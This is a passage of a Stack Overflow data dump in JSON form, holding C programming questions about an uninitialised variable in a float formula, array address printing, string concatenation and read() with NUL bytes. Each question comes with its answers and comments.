"accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1476263729, "post_id": 39993873, "comment_id": 67267492, "body": "The difference between 278.24 and 278.23999 is 0.00001. Assume you measured the length of a field in meters, the error would be a thousandth of a millimeter, or 10 microns. Or if your fortune amounts to $278,240,000, will you care about $10 ? I cannot call that &quot;no very precise&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 1, "creation_date": 1476262486, "post_id": 39994194, "comment_id": 67266697, "body": "Since when is it typically zero? It is undefined and I would assume it is not zero more often than it is. Solid answer, it just sounds so trivial while its a grave mistake."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 3, "creation_date": 1476263480, "post_id": 39994194, "comment_id": 67267309, "body": "@KamiKaze In this case the variable is declared at file scope, meaning it has static storage duration and is therefore always zero. Guaranteed by the C standard, so the answer is correct, apart from the &quot;typically&quot; - it <i>will</i> be zero. Still, it is bad practice to write programs that rely on zero-initialization of static storage duration variables."}, {"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476266071, "post_id": 39994194, "comment_id": 67269065, "body": "@Lundin The clarification is greatly appreciated."}], "tags": [], "owner": {"reputation": 6816, "user_id": 865481, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0b2if.gif?s=128&g=1", "display_name": "Salix alba", "link": "https://stackoverflow.com/users/865481/salix-alba"}, "is_accepted": false, "score": 4, "last_activity_date": 1476261753, "creation_date": 1476261753, "answer_id": 39994194, "question_id": 39993873, "link": "https://stackoverflow.com/questions/39993873/c-math-lib-float-miscalculations/39994194#39994194", "title": "C math lib - float miscalculations?", "body": "<p>In this line </p>\n\n<pre><code>b= pow(t_abl_s,(t_out/(320-(t_out*4) )))*0.65*kurv_steil*  b  *(-t_out+20);\n</code></pre>\n\n<p>you are using the variable b on the right-hand side. This will typically be zero when the program starts, so anything multiplied by it will be zero. Don't rely on any variable having a specific value, always initialise your variables. </p>\n"}, {"tags": [], "owner": {"reputation": 17580, "user_id": 493106, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/48b0c7ab491edf2f69e63773181a22b5?s=128&d=identicon&r=PG", "display_name": "xaxxon", "link": "https://stackoverflow.com/users/493106/xaxxon"}, "is_accepted": false, "score": 0, "last_activity_date": 1476262618, "creation_date": 1476262618, "answer_id": 39994469, "question_id": 39993873, "link": "https://stackoverflow.com/questions/39993873/c-math-lib-float-miscalculations/39994469#39994469", "title": "C math lib - float miscalculations?", "body": "<p>As you can see in this link, 1.44 cannot be represented in binary:</p>\n\n<p><a href=\"http://www.wolframalpha.com/input/?i=1.44+in+binary\" rel=\"nofollow\">http://www.wolframalpha.com/input/?i=1.44+in+binary</a></p>\n\n<p>So any floating point computations you do with it will be imprecise.</p>\n\n<p>A more familiar example is to try to represent 1/3.  In base3, it's simply 0.1.   In decimal, it's 0.33333...   It's the same idea with any decimal number ending in .44.   It cannot be precisely represented in binary.</p>\n"}, {"tags": [], "owner": {"reputation": 134, "user_id": 6915174, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BUmUa.jpg?s=128&g=1", "display_name": "Peter K.", "link": "https://stackoverflow.com/users/6915174/peter-k"}, "is_accepted": true, "score": 0, "last_activity_date": 1476262626, "creation_date": 1476262626, "answer_id": 39994476, "question_id": 39993873, "link": "https://stackoverflow.com/questions/39993873/c-math-lib-float-miscalculations/39994476#39994476", "title": "C math lib - float miscalculations?", "body": "<p>as told above the problem is in formula you use. You have <code>b=... *b*...</code>. The <code>b</code> has unknown value by this moment (most likely compiler set it to 0) so you have <code>b=...*0*...</code> which makes end result has 0 value.</p>\n\n<p>Also you should add <code>2* ... + t_abl_s+kurv_korr</code> to your formula</p>\n\n<p>So the formula will looks like</p>\n\n<pre><code>b= 2 *\n   pow(t_abl_s,(t_out/(320-(t_out*4) ))) *\n   0.65 * kurv_steil *\n   (-t_out+20) +\n   t_abl_s + kurv_korr;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 0, "creation_date": 1476265990, "post_id": 39994716, "comment_id": 67269014, "body": "As soon as you use floating point you are bound to have errors in it. It&#39;s your duty to keep them low. Because of this you don&#39;t compare float with ==. For example try 0.1+0.1+0.1 == 0.3 this should be false."}], "tags": [], "owner": {"reputation": 117, "user_id": 6260879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e55b69bfe0561e4d7f7dcb022aaf17?s=128&d=identicon&r=PG&f=1", "display_name": "Christian", "link": "https://stackoverflow.com/users/6260879/christian"}, "is_accepted": false, "score": 0, "last_activity_date": 1476263309, "creation_date": 1476263309, "answer_id": 39994716, "question_id": 39993873, "link": "https://stackoverflow.com/questions/39993873/c-math-lib-float-miscalculations/39994716#39994716", "title": "C math lib - float miscalculations?", "body": "<p>Thanks guys!</p>\n\n<p>Oh man! I was so stupid. Yes, indeed there was a \"*b\" in the formula which resulted in being \"0\" all time as b was not initialized before (and obviously by random always zero).</p>\n\n<p>Regarding the precision of the calculation I am not convinced as 278.24 is not the same as 278.23999. On the other side, it works for me now.</p>\n\n<p>Thanks!</p>\n"}], "owner": {"reputation": 117, "user_id": 6260879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e55b69bfe0561e4d7f7dcb022aaf17?s=128&d=identicon&r=PG&f=1", "display_name": "Christian", "link": "https://stackoverflow.com/users/6260879/christian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 39994476, "answer_count": 4, "score": -1, "last_activity_date": 1476263754, "creation_date": 1476260761, "last_edit_date": 1476263754, "question_id": 39993873, "link": "https://stackoverflow.com/questions/39993873/c-math-lib-float-miscalculations", "title": "C math lib - float miscalculations?", "body": "<p>I am aware of floating points in C not being very precise. But I have a sniplet where I do not understand why I am getting such results.\nFirst, if I do the calculate within one line I am getting a wrong \"0\" as result.\nJust if I split the same calculations into several commands I am getting nearly what I would expect.</p>\n\n<p>So first questions:</p>\n\n<ol>\n<li>Why is the single line different from the split lines?</li>\n<li>Is there any way how to calculate in a more precise way? I mean, 320-(10.44*4) should be 278.24 and not 278.23999! I understand rounding issues at number like roots or pi or so. But not in above example.</li>\n</ol>\n\n<p>Ok, here is my code (minimized sniplet):</p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n\nfloat kurv_steil,\n        kurv_korr,\n        t_abl_s,\n        t_out,\n        t_abl_s,\n        b,\n        t_tank_s;\n\nvoid main()\n{\n    t_tank_s=32;\n    kurv_steil=0.85;\n    kurv_korr=-5;\n    t_out=1.44;\n    t_abl_s=24;\n\n    printf(\"Werte: k_steil: %f k_korr: %f t_out: %f t_abl_s: %f\\n\",kurv_steil,kurv_korr,t_out,t_abl_s);\n    b= pow(t_abl_s,(t_out/(320-(t_out*4) )))*0.65*kurv_steil*b*(-t_out+20);\n\n    printf(\"[temp] Ganze Rechnung tank_s: %f\\n\",b);\n    b=320-(t_out*4);\n\n    printf(\"[temp] 320-(t_out*4) b: %f\\n\",b);\n    b=t_out/b;\n\n    printf(\"[temp] t_out/b b: %f\\n\",b);\n    b=pow(t_abl_s,b);\n\n    printf(\"[temp] t_abl_s^b b: %f\\n\",b);\n    b=0.65*kurv_steil*b;\n\n    printf(\"[temp] 0.65*kurv_steil*b b: %f\\n\",b);\n    b=b*(-t_out+20);\n\n    printf(\"[temp] b*(-t_out+20) b: %f\\n\",b);\n    b=2*b+t_abl_s+kurv_korr;\n\n    printf(\"[temp] 2*b*(-t_abl_s) b: %f\\n\",b);\n}\n</code></pre>\n\n<p>Output is:</p>\n\n<pre><code>Werte: k_steil: 0.850000 k_korr: -5.000000 t_out: 1.440000 t_abl_s: 24.000000\n[temp] Ganze Rechnung tank_s: 0.000000\n[temp] 320-(t_out*4) b: 314.239990\n[temp] t_out/b b: 0.004582\n[temp] t_abl_s^b b: 1.014670\n[temp] 0.65*kurv_steil*b b: 0.560605\n[temp] b*(-t_out+20) b: 10.404831\n[temp] 2*b*(-t_abl_s) b: 39.809662\n</code></pre>\n\n<p>I would expect to have the first output have the same value of \"39.809662\", but it always has \"0\". Why?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 1, "creation_date": 1476260091, "post_id": 39993648, "comment_id": 67265260, "body": "Output could be literally anything, since you have Undefined Behaviour. Use <code>%p</code> for pointers in <code>printf</code>."}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 2, "creation_date": 1476260316, "post_id": 39993648, "comment_id": 67265366, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/232303/so-you-think-you-know-pointers\">So you think you know pointers?</a>"}, {"owner": {"reputation": 1, "user_id": 5881554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNcMW.jpg?s=128&g=1", "display_name": "Nishant Lamichhane", "link": "https://stackoverflow.com/users/5881554/nishant-lamichhane"}, "reply_to_user": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476260415, "post_id": 39993648, "comment_id": 67265419, "body": "@PaulR check the website <a href=\"http://www.studytonight.com/c/tests/3\" rel=\"nofollow noreferrer\">studytonight.com/c/tests/3</a>. Its showing answer 1200 1200 1200 that&#39;s why I wanna know how does it work?"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476260512, "post_id": 39993648, "comment_id": 67265473, "body": "@Sillent_Killerzz: given that example I suggest you avoid that site in future."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 2, "creation_date": 1476260639, "post_id": 39993648, "comment_id": 67265540, "body": "A lot of s... around the web..."}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 3, "creation_date": 1476260728, "post_id": 39993648, "comment_id": 67265606, "body": "@Sillent_Killerzz the first 5 questions on this site are garbage, the 6th question is the first which makes sense. The first is undefined behaviour, the answer of the second is &quot;none of them&quot;, the answer of the third is &quot;all miss a ; at the end&quot;, ..."}, {"owner": {"reputation": 1, "user_id": 5881554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNcMW.jpg?s=128&g=1", "display_name": "Nishant Lamichhane", "link": "https://stackoverflow.com/users/5881554/nishant-lamichhane"}, "reply_to_user": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1476260853, "post_id": 39993648, "comment_id": 67265699, "body": "@mch Thank you for the information. I was also a little bit confused why its answer is that? Why are these sites giving wrong knowledge?"}, {"owner": {"reputation": 1, "user_id": 5881554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNcMW.jpg?s=128&g=1", "display_name": "Nishant Lamichhane", "link": "https://stackoverflow.com/users/5881554/nishant-lamichhane"}, "reply_to_user": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476261032, "post_id": 39993648, "comment_id": 67265805, "body": "@PaulR which is the best site to practice C programs? Can you help me?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1476261165, "post_id": 39993648, "comment_id": 67265889, "body": "I wish we had something like a Stack Overflow blacklist over crappy sites. This studytonight.com site is awful! That test is written by a clueless beginner with completely outdated C knowledge. I peeked at their tutorial too and it is outdated by 25 years or so. Stay clear from that site!"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476261169, "post_id": 39993648, "comment_id": 67265892, "body": "@Sillent_Killerzz: unfortunately there are a lot of bad sites out there - I suggest you get a good book instead - here is a <a href=\"http://stackoverflow.com/q/562303/253056\">somewhat useful list</a>."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476261283, "post_id": 39993648, "comment_id": 67265969, "body": "@Lundin: yes, I just noticed a dubious book on there (Norton) - I don&#39;t know of a better list though ?"}, {"owner": {"reputation": 1, "user_id": 5881554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNcMW.jpg?s=128&g=1", "display_name": "Nishant Lamichhane", "link": "https://stackoverflow.com/users/5881554/nishant-lamichhane"}, "reply_to_user": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476261469, "post_id": 39993648, "comment_id": 67266072, "body": "@PaulR can you refer me a best website rather than a book?"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476261681, "post_id": 39993648, "comment_id": 67266212, "body": "@Sillent_Killerzz: most tutorial web sites are garbage - you can try some of the beginner challenges at <a href=\"http://hackerank.com\" rel=\"nofollow noreferrer\">hackerank.com</a>, or the <a href=\"https://www.reddit.com/r/dailyprogrammer\" rel=\"nofollow noreferrer\">dailyprogrammer subreddit</a>, but if you&#39;re serious about learning to program then you&#39;ll need at least one good book."}], "answers": [{"tags": [], "owner": {"reputation": 930, "user_id": 4511056, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75bb6c2868ac49ca03c83544133f34b3?s=128&d=identicon&r=PG&f=1", "display_name": "Secto Kia", "link": "https://stackoverflow.com/users/4511056/secto-kia"}, "is_accepted": false, "score": 1, "last_activity_date": 1476260345, "creation_date": 1476260345, "answer_id": 39993743, "question_id": 39993648, "link": "https://stackoverflow.com/questions/39993648/what-will-be-the-output-of-the-program-if-the-array-begins-1200-in-memory/39993743#39993743", "title": "What will be the output of the program if the array begins 1200 in memory?", "body": "<p>arr &amp;arr[0] and &amp;arr all give the address of the array.</p>\n\n<p>But the address of an array is not necessarily an integer, so your printf causes undefined behaviour.</p>\n\n<p>The correct way would be: <code>printf(\"%p\\n\",(void *)arr);</code>. The actual output depends on your implementation and is most likely meaningless to you for any purpose for C programming.</p>\n"}, {"tags": [], "owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "is_accepted": false, "score": 0, "last_activity_date": 1476261464, "creation_date": 1476261464, "answer_id": 39994102, "question_id": 39993648, "link": "https://stackoverflow.com/questions/39993648/what-will-be-the-output-of-the-program-if-the-array-begins-1200-in-memory/39994102#39994102", "title": "What will be the output of the program if the array begins 1200 in memory?", "body": "<p><code>arr</code> gives the base address of array (starting memory address of <code>arr</code>) </p>\n\n<p><code>&amp;arr[0]</code> gives the address of first element in <code>arr</code> which is <code>1200.</code></p>\n\n<p><code>&amp;arr</code> is the address of the array itself (<code>int arr[]={2, 3, 4, 1, 6};</code>), so if you do <code>&amp;arr+1</code> it will points to memory just past the end of the entirety of your array (<code>1200+sizeof(int)*5</code>).</p>\n"}], "owner": {"reputation": 1, "user_id": 5881554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNcMW.jpg?s=128&g=1", "display_name": "Nishant Lamichhane", "link": "https://stackoverflow.com/users/5881554/nishant-lamichhane"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1490, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1476261464, "creation_date": 1476259966, "last_edit_date": 1476260648, "question_id": 39993648, "link": "https://stackoverflow.com/questions/39993648/what-will-be-the-output-of-the-program-if-the-array-begins-1200-in-memory", "title": "What will be the output of the program if the array begins 1200 in memory?", "body": "<pre><code> #include&lt;stdio.h&gt;\n main()\n {\n    int arr[]={2, 3, 4, 1, 6};\n    printf(\"%u, %u, %u\\n\", arr, &amp;arr[0], &amp;arr);\n    return 0;\n }\n</code></pre>\n\n<p>Its Output is:-\n1200 1200 1200\nI want to know how its answer is 1200?</p>\n\n<p>I want to know how does it work??</p>\n"}, {"tags": ["c", "string"], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1476258764, "creation_date": 1476258764, "answer_id": 39993307, "question_id": 39993278, "link": "https://stackoverflow.com/questions/39993278/connecting-two-strings-into-one-c/39993307#39993307", "title": "Connecting two strings into one. C", "body": "<p>Create an array big enough to fit both strings plus a single terminator. Copy the first string into the array. Concatenate the other string using <a href=\"http://en.cppreference.com/w/c/string/byte/strcat\" rel=\"nofollow\"><code>strcat</code></a>.</p>\n"}, {"comments": [{"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 0, "creation_date": 1476261730, "post_id": 39993320, "comment_id": 67266239, "body": "you should always typecast return memory of <code>malloc</code>"}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 1, "creation_date": 1476268176, "post_id": 39993320, "comment_id": 67270398, "body": "@rootTraveller <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">I disagree, rather strongly</a>."}, {"owner": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "reply_to_user": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 0, "creation_date": 1476268577, "post_id": 39993320, "comment_id": 67270666, "body": "@unwind yes but  <code>void*</code> don&#39;t get promoted in older version of C."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 6288, "user_id": 5167682, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/2vexc.jpg?s=128&g=1", "display_name": "roottraveller", "link": "https://stackoverflow.com/users/5167682/roottraveller"}, "edited": false, "score": 0, "creation_date": 1476270542, "post_id": 39993320, "comment_id": 67271868, "body": "@rootTraveller I don&#39;t believe that to be true (C89 sure is &quot;older&quot;, and does this conversion automatically), but even if it were I disagree with that mattering to how people program today. Requiring code to build on ancient compilers is not normal."}], "tags": [], "owner": {"reputation": 418, "user_id": 2597190, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/bae53161f7d4ffa8300295f7e962c59e?s=128&d=identicon&r=PG", "display_name": "Du\u0161an Tich&#253;", "link": "https://stackoverflow.com/users/2597190/du%c5%a1an-tich%c3%bd"}, "is_accepted": false, "score": 1, "last_activity_date": 1476258793, "creation_date": 1476258793, "answer_id": 39993320, "question_id": 39993278, "link": "https://stackoverflow.com/questions/39993278/connecting-two-strings-into-one-c/39993320#39993320", "title": "Connecting two strings into one. C", "body": "<p>Try this method</p>\n\n<pre><code>char* concat(const char *s1, const char *s2)\n    {\n        char *result = malloc(strlen(s1)+strlen(s2)+1);\n        strcpy(result, s1);\n        strcat(result, s2);\n        return result;\n    }\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 6450956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7d2c2d78ebc675e23923a7aa4cfd46e?s=128&d=identicon&r=PG&f=1", "display_name": "ewazdomu", "link": "https://stackoverflow.com/users/6450956/ewazdomu"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 158, "favorite_count": 0, "closed_date": 1476258848, "answer_count": 2, "score": -1, "last_activity_date": 1476258793, "creation_date": 1476258645, "question_id": 39993278, "link": "https://stackoverflow.com/questions/39993278/connecting-two-strings-into-one-c", "closed_reason": "Duplicate", "title": "Connecting two strings into one. C", "body": "<p>How can I end a string in C? I made a function to connect 2 strings and make one. I read I should end string with '\\0' but how to do this with declaration like this? </p>\n\n<pre><code>char* string1= \"House\";\nchar* string2= \"is big\";\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12097, "user_id": 1080064, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/100000753306178/picture?type=large", "display_name": "tkausl", "link": "https://stackoverflow.com/users/1080064/tkausl"}, "edited": false, "score": 2, "creation_date": 1476255761, "post_id": 39992352, "comment_id": 67262739, "body": "This is how c-strings work. Otherwise, your <code>printf</code> wouldn&#39;t know where the string ends."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1476256035, "post_id": 39992352, "comment_id": 67262929, "body": "A better test is to fill the buffer with some character, e.g. <code>&#39;x&#39;</code>, then <code>read</code>, and print the contents of the buffer as hex numbers in a loop: <code>for (int i=0;i&lt;20;i++) printf(&quot;%02x\\n&quot;, buf[i]);</code>"}], "answers": [{"tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": true, "score": 1, "last_activity_date": 1476255806, "creation_date": 1476255806, "answer_id": 39992419, "question_id": 39992352, "link": "https://stackoverflow.com/questions/39992352/why-0-ends-the-input-of-read/39992419#39992419", "title": "Why &#39;\\0&#39; ends the input of read()?", "body": "<p>The <code>input</code> is read <em>after</em> the <code>\\0</code> byte. However, <code>%s</code> <code>printf</code> format specifier expects a <code>\\0</code>-terminated string.</p>\n\n<p>Instead of <code>printf</code> try <code>write</code>ing <code>n</code> bytes to <code>STDOUT_FILENO</code> or 1:</p>\n\n<pre><code>write(1, buf, n);\n</code></pre>\n"}], "owner": {"reputation": 1243, "user_id": 1487773, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/gnHdG.png?s=128&g=1", "display_name": "Igor Liferenko", "link": "https://stackoverflow.com/users/1487773/igor-liferenko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 39992419, "answer_count": 1, "score": -1, "last_activity_date": 1476255806, "creation_date": 1476255587, "question_id": 39992352, "link": "https://stackoverflow.com/questions/39992352/why-0-ends-the-input-of-read", "title": "Why &#39;\\0&#39; ends the input of read()?", "body": "<p>The following code demonstrates that if there is <code>\\0</code> in the input, the input is not read after it.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{\n  int fd;\n  int fd2;\n  char buf[200];\n  int n;\n  char fname[] = \"/tmp/tst-perror.XXXXXX\";\n  fd = mkstemp (fname);\n  fd2 = dup (fd);\n  write(fd2, \"a\", 2); // \\0 is written out\n  write(fd2, \"b\", 1);\n  write(fd2, \"\\n\", 1);\n  close (fd2);\n  lseek (fd, 0, SEEK_SET);\n  n = read (fd, buf, sizeof (buf));\n  printf(\"%.*s\", (int) n, buf);\n  close (fd);\n  unlink (fname);\n  return 0;\n}\n</code></pre>\n\n<p>The output is <code>a</code>.</p>\n\n<p>If we use <code>1</code> instead of <code>2</code> in the first <code>write()</code>, the output is <code>ab</code>. Is it proper behavior? I did not find anything about it in read(2).</p>\n"}, {"tags": ["c", "variables", "range"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476255034, "post_id": 39992128, "comment_id": 67262352, "body": "The article you link to is hopelessly out of date and incorrect - the table of int sizes and ranges is particularly bad. You should probably avoid that web site in general and use a more reliable reference."}, {"owner": {"reputation": 992, "user_id": 3225001, "user_type": "registered", "profile_image": 